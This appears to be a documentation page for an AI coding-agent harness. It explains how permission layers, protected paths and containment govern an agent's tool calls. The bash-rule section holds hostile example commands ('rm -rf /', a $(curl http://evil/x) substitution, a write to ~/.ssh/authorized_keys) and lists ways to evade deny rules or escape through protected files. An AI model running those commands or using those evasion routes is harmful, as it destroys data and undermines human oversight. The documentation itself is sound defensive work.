---
title: Permission Precedence
description: The order Crucible consults every layer that can allow or deny a tool call
status: implemented
tags:
  - concepts
  - permissions
  - security
  - lua
---

# Permission Precedence

Five different things can decide whether a tool call runs: a CLI flag, the
`[permissions]` config, a saved "allow for this project" pattern, a Lua hook,
and the session's mode. They are consulted in a fixed order, and the first one
with an opinion wins.

This page states that order once. The layers themselves are documented
separately — [[Help/Config/permissions]], [[Help/Extending/Event Hooks]],
[[Help/TUI/Modes]], [[Help/Extending/Agent Cards]].

## Read this before you rely on a `deny` rule

**Command blocking is best-effort. Do not rely on it to prevent a catastrophic
action.**

A `deny` rule reads the text of a command. A shell decides what a command *does*
at run time. The two are not the same thing, and text cannot answer the run-time
question. Crucible closes the differences it can see and reports the ones it
cannot, but the list of things it cannot see has no end:

- An alias or a shell function can point any name at any program.
- `$PATH` order decides which `rm` runs.
- A program that Crucible does not know can run another program.
- A different program can have the same effect. A rule that names `rm` does not
  cover `find . -delete`.
- A command name can come from a variable, and its value exists only at run time.

Treat a `deny` rule as a guard against an accident, not as a barrier against
intent. It stops an agent that makes a mistake. It does not stop an agent, or a
person, that works around it.

**To prevent a catastrophic action, use containment, not a rule.** Run the agent
in a container ([[Help/Extending/Container Isolation]]), give it a workspace it
may destroy, and keep backups of what matters. A permission rule is one layer of
defence and it is the weakest one.

## The order

Every tool call the agent makes walks this list top to bottom. The first layer
that says **allow** or **deny** ends it; a layer with nothing to say falls
through to the next.

Two trust boundaries run *before* this list is consulted at all — an agent
card's tool policy and a plugin's isolation claim. See "Above the chain" below.

| # | Layer | Set by |
|---|-------|--------|
| 1 | CLI `--permissions` override | the flag you launched with |
| 2 | `[permissions]` config | `config.toml` (global or kiln) |
| 3 | Saved patterns | answering "allow for this project" at a prompt |
| 4 | Lua permission hooks | `cru.permissions.on_request` |
| 5 | Mode rules, then mode stance | `cru.modes.<name>.permissions` |
| 6 | Non-interactive sessions: ask becomes deny | how the session was started |
| 7 | Prompt the user | — |

The implementation is `handle_permission_request` in
`crates/crucible-daemon/src/agent_manager/messaging/permission.rs`; it is the
source of truth if this page ever drifts from it.

### 1 — CLI override

`--permissions allow` or `--permissions deny` short-circuits everything. It runs
before any hook, so a hook cannot rescue a call the flag denied, and cannot
block one it allowed. `ask` and no flag fall through.

### 2 — `[permissions]` config

Config **deny is absolute** — nothing below can override it. Config **allow**
short-circuits the gate, including `default = "allow"`. Only `ask`, or no
matching rule, falls through.

This is why an agent card granting `bash: allow` cannot sidestep a configured
deny: the card is consulted earlier, but a card-allowed tool still has its
config deny checked.

### 3 — Saved patterns

When you answer a prompt with "allow for this project", the pattern is written
to the project's store and matched here on subsequent calls. Saved patterns are
per-project, not per-session, and survive restarts.

### 4 — Lua permission hooks

Hooks run in `priority` order (lower first) and the first non-`nil` verdict
wins:

```lua
cru.permissions.on_request(function(request)
  if request.tool_name == "bash" and request.args.command:match("^git push") then
    return { deny = "pushes go through review" }
  end
end, { priority = 10 })
```

`{ pattern = "bash" }` filters at registration instead, so the hook is never
called for other tools:

```lua
cru.permissions.on_request(function(request)
  -- only ever sees bash
end, { pattern = "bash" })
```

`request.is_safe` tells you whether the daemon classifies the tool as read-only.
For external MCP tools that comes from the server's `readOnlyHint` annotation,
so a read-only tool is not lumped in with the ones that write.

**Hooks fail closed.** A hook that errors denies the call. This is the opposite
of every other hook type in Crucible, which fails open — a permission hook that
crashes must not become an approval.

### 5 — Mode rules, then mode stance

A mode can state a stance, a set of rules, or both:

```lua
cru.modes.review = {
  tools = { "read_*", "grep", "glob", "bash" },
  permissions = {
    default = "deny",
    allow = { "bash:rg *", "bash:git log *" },
  },
}
```

Rules are evaluated first, the bare stance second. Both use the same grammar and
the same engine as `[permissions]`, so `bash:rg *` inherits its handling of
chained commands — a mode that permits `rg` does **not** thereby permit
`rg foo && rm -rf /`. What that handling covers, and where it stops, is stated
in [What a `bash:` rule covers](#what-a-bash-rule-covers) below; read it before
relying on a mode's `allow` list as a boundary.

Modes come after hooks deliberately. A stance is a static declaration; a hook is
a decision. `cru.modes.auto` saying "allow by default" must not override a hook
that denies `bash`.

### 6 — Non-interactive sessions

A delegated child session or a headless send has nobody to answer a prompt.
Rather than hang, anything that reached this point is denied with a message
naming the three ways to permit it.

This step is easy to forget and it changes behaviour: the same tool call that
*asks* in your terminal *denies* inside a delegation. See [[Help/Concepts/Delegation]].

### 7 — Prompt

Whatever is left reaches you, with a diff preview where one can be synthesised.

## What a `bash:` rule covers

A `bash:` rule's glob is matched against a command *string*, and one string can
run several commands. Layer 2 and layer 5 therefore do not match the rule
against the whole line: they split it into statements first and evaluate each
one, so an `allow` rule only ever speaks for the command it names.

This section is the guarantee, stated once. It applies wherever the engine
runs — `[permissions]`, a mode's `permissions` block, and the saved patterns of
layer 3.

**The line is split on** `&&`, `||`, `;`, `|`, a bare `&`, and a newline —
outside quotes, and honouring backslash escapes. Every statement is checked
independently: the hardcoded denies and the `deny` rules must clear *all* of
them, and `Allow` requires *every* one to match an `allow` rule. So
`allow = ["bash:git *"]` with `deny = ["bash:rm *"]` denies all of
`git status && rm -rf /tmp/x`, `git status; rm …`, `git status | rm …`,
`git status & rm …`, and the same lines written across two lines.

Redirection syntax is not mistaken for a separator, so `2>&1`, `>&2`, `<&0` and
`&> out.log` stay part of the command they belong to.

**Some constructs hide a command from the splitter**, and where they appear the
decision falls to your configured `default` — `ask` unless you changed it —
instead of to whichever command happens to be leftmost:

- `` `…` `` and `$(…)` command substitution, including inside double quotes
  (single quotes suppress substitution, so those are matched normally)
- `<(…)` and `>(…)` process substitution
- a quote that never closes, which makes everything the scan saw after it
  unreliable

`git log $(curl http://evil/x)` therefore prompts rather than riding
`bash:git *`. This is a deliberate widening of what prompts: a workflow that
used to run silently under an `allow` rule will start asking once it contains a
substitution. A `deny` rule and a hardcoded deny still win over this fallback —
falling back never softens a refusal into a prompt.

**What it does not cover.** Be concrete about the edges rather than trusting the
split further than it goes:

- **Redirection targets are not modelled.** An `allow` rule constrains *which*
  command runs, never *where it writes*: `bash:echo *` permits
  `echo hi > ~/.ssh/authorized_keys`. Reporting `>` alongside the constructs
  above was considered and rejected — it hides no second command, and firing on
  every `> /dev/null` would make prompting the normal case. Allow-list only
  commands you would trust with a filesystem write, and reach for a Lua hook
  (layer 4) when you need the argument-level decision.
- **The allowed command's own power is yours to judge.** `bash:git *` permits
  `git config`, aliases, and hooks; most useful binaries are a write primitive
  or an execution primitive given the right flags.
- **A rule names a command, not an effect.** `deny = ["bash:rm *"]` follows `rm`
  through the ways a shell can spell it — `sudo rm`, `/bin/rm`, `env FOO=1 rm`,
  `(rm …)`, `xargs rm`, `timeout 5 rm`, a tab instead of a space — because the
  statement is also matched against its resolved command word
  (`resolve_command_word`). It does **not** follow the *effect*:
  `find . -delete` and `perl -e 'unlink …'` delete files and are not `rm`, so a
  rule naming `rm` never covers them. Name the program, or deny the tool.
- **The wrapper list is a list.** Wrappers outside it (`WRAPPERS` in
  `normalize.rs`) still hide the command they run. Adding one is a one-line
  change; noticing you needed to is the hard part.
- **Aliases, shell functions and `$PATH` are invisible.** `alias rm=…`, a
  function named `git` that calls `rm`, or a different `rm` earlier on the path
  are all outside what statement text can show. Resolution raises the cost of
  evading a `deny` rule; it does not make `deny` a sandbox — containment is the
  container.
- **`eval`, `sh -c` and expanded command names prompt instead.** Their program is
  data, so they are reported rather than guessed at and fall to the default. Under
  `default = "allow"` *with* `deny` rules configured they prompt rather than being
  allowed, since allowing them would mean the blocklist is silently unenforced on
  exactly the lines it cannot read.

The splitter is `split_command_line` in
`crates/crucible-core/src/config/components/permissions/normalize.rs`, and it is
the source of truth if this section drifts.

## Above the chain

Two trust boundaries run before the chain is consulted. Neither is a layer in
it: they decide whether the chain runs at all, and no layer can override them.

### The agent-card gate decision

An agent card can declare a per-tool policy — `deny`, `ask`, or `allow` — see
[[Help/Extending/Agent Cards]].

- **`deny` refuses outright, before everything** — including the
  `pre_tool_call` hook loop. Checked that early deliberately: a hook that
  handles a call returns before any gate, so a later check would let a plugin
  see the arguments of, rewrite, or fabricate a result for a tool the session
  policy refuses. Denied tools are also excluded from the tool definitions the
  model sees; this is defense in depth.
- **`ask` forces the chain**, even for a tool the daemon classifies as
  read-only.
- **`allow` skips the chain** — the saved patterns, the Lua hooks, the mode
  rules and the mode stance are never consulted. The one thing still checked is
  layer 2's deny: `[permissions]` deny rules are evaluated even for
  card-allowed tools, so a card shipped by an untrusted kiln cannot sidestep a
  configured deny. A card-allowed call is marked auto-approved ("agent card
  policy") on its tool-call event.
- **No policy** — the chain runs unless the tool is on the daemon's built-in
  read-only list. An MCP server's `readOnlyHint` is deliberately not consulted
  for this decision: a third-party server must not be able to annotate its way
  past a mode's `default = "deny"`.

The decision is `requires_permission_gate` in
`crates/crucible-daemon/src/agent_manager/messaging/gate_decision.rs`; the
`deny` half is enforced earlier, in `tool_call.rs`.

### The plugin isolation gate

A plugin that sandboxes a session — the `oci` plugin and its container, see
[[Help/Extending/Container Isolation]] — calls `crucible.require_isolation` at
session start. From then on the session is **default-deny for host execution**:
a tool call that no `pre_tool_call` handler took over is refused before the
chain runs, because executing it would run wherever the daemon runs — outside
the sandbox. The handler taking the call over *is* the sandbox, which is why
this gate sits after the hook loop.

Whether a tool is "host-touching" is answered by its surface, declared by the
executor that would run it — not by a list of names:

- **Host** — touches the host filesystem or executes host processes. Refused
  unless named on the claim's `exempt` list.
- **Daemon** — reaches daemon-side state only: notes, embeddings, the kiln,
  jobs. Passes untouched; containerizing a workspace says nothing about these.
- **Unknown** — runs daemon-side but can reach anything (MCP gateway tools,
  plugin Lua). Treated exactly like Host.

The refusal message names the claiming plugin and points at its `exempt` list.
No layer in the chain can rescue a refused call — the chain never runs. The
claim is released at session end.

### Order within one call

Card `deny` → `pre_tool_call` handlers (a handled call bypasses everything
below) → isolation gate → the gate decision (card `allow`/`ask`, else the
read-only list) → config deny check when the chain is skipped → the
seven-layer chain.

## Underneath all of it

Five things are not part of the chain and cannot be overridden by any layer in
it:

- **Hardcoded denies** — a small set of calls the daemon refuses outright.
- **Protected paths** — a hardcoded set of directories that agent tools may
  **read but never write**, whatever the chain above decided: `.crucible/`,
  `.git/`, the other harnesses' `.claude/` `.codex/` `.opencode/` `.pi/`, the
  `runtime/` tree Crucible loads plugins from, `~/.config/crucible`, every
  session-transcript directory, and the shell startup files (`~/.bashrc`,
  `~/.zshrc`, …) **in your home directory** — a copy of the same file inside a
  dotfiles repository stays writable, because no shell reads that one.
  Nothing in the chain reaches this — a blanket
  `--permissions allow` decides that a tool *call* runs, and this decides what
  a *path* is, so the call runs and the write is still refused. There is no
  configuration key that re-opens one.

  The reason is that these are the files a trusted process later executes or
  reads as instructions: a plugin, an agent card, a skill, a git hook, another
  harness's settings, or a transcript replayed into a future context. An agent
  that can write one has escaped through the thing that consumes it rather
  than through the filesystem. It applies to paths that **do not exist yet** —
  creating the file is the attack — and to what a symlink at a protected path
  points to.

  Reads are deliberately untouched. Explaining your own plugin is ordinary
  work; rewriting it is not.
- **Filesystem containment** — a default-deny allowlist of the session's kilns,
  its workspace and its own session directory, with every transcript subtree
  those enclose carved back out. Every filesystem-touching tool goes through one
  capability handle to reach a path — `read_file`, `write_file`, `glob` and
  `grep` alongside the note, search and kiln tools — so the rule cannot differ
  between them, and a tool cannot obtain a path without having asked. The
  refusal names the path you asked for and, when a symlink carried it out of
  containment, where it landed.

  Scoped honestly: this holds for the file tools. `bash` reaches the filesystem
  through a shell the daemon does not mediate, so containment is defense in
  depth for a session rather than a boundary around it until the kernel-level
  backstop lands.
- **The shell policy** — parsing and vetting of shell commands, independent of
  whether `bash` was permitted.
- **Plan-mode tool filtering** — plan mode removes tools from what the agent can
  see at all. A tool that is not advertised cannot be called, so no permission
  question arises.

The first four are floors. Plan mode's filtering is a floor too, but note that
the *policy* half of plan mode is declared in Lua like any other mode's — see
[[Help/TUI/Modes]].

## Which layer should I use?

| You want | Use |
|---|---|
| A rule for every session on this machine | `[permissions]` config |
| A rule for one project | answer a prompt with "allow for this project" |
| A decision that depends on the arguments | a Lua hook |
| A named working posture you switch between | a mode |
| A per-agent tool list | an agent card — see [[Help/Extending/Agent Cards]] |

Reach for the earliest layer that expresses what you mean. A hook that
re-implements "always allow `cargo test`" is a config line written the hard way,
and it runs on every call.

## See also

- [[Help/Config/permissions]] — the rule grammar and config file
- [[Help/TUI/Modes]] — declaring and switching modes
- [[Help/Extending/Event Hooks]] — the hook system generally
- [[Help/Extending/Agent Cards]] — per-agent tool policy
- [[Help/Concepts/Trust and Classification]] — which providers may see which kilns
